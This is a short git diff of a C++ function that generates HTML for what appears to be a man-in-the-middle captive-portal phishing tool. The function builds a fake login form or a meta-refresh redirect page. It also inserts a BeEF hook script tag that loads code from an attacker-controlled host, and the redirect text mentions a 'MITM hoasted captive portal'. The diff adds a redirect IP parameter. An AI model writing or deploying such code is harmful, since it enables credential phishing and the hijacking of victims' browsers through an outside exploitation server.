@@ -41,10 +41,11 @@ returns a string containing the html needed to make wither a redirect or form wi
  @return The html you need when the xenomorphs come calling
 
 */
-std::string make_html(std::string hook_loc, std::string formaction, bool form_or_redirect) {
+std::string make_html(std::string hook_loc, std::string redirect, std::string formaction, bool form_or_redirect) {
     std::string html_redirect_body;
     std::string html_form_body;
     std::string hook_location;
+    std::string redirect_ip = redirect;
     std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
     std::string html_form_body_top = "<body><form class=\"login\" ";
     std::string form_action = "action=\"" + formaction + "\" ";
@@ -56,7 +57,7 @@ std::string make_html(std::string hook_loc, std::string formaction, bool form_or
         </body>\
         </html>";
     std::string html_redirect_head = "<html><head>";
-    beef_hook = "<script src=" + hook_loc + "></script>";
+    std::string beef_hook = "<script src=" + hook_loc + "></script>";
     std::string html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
     std::string redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
     if (form_or_redirect == true) {
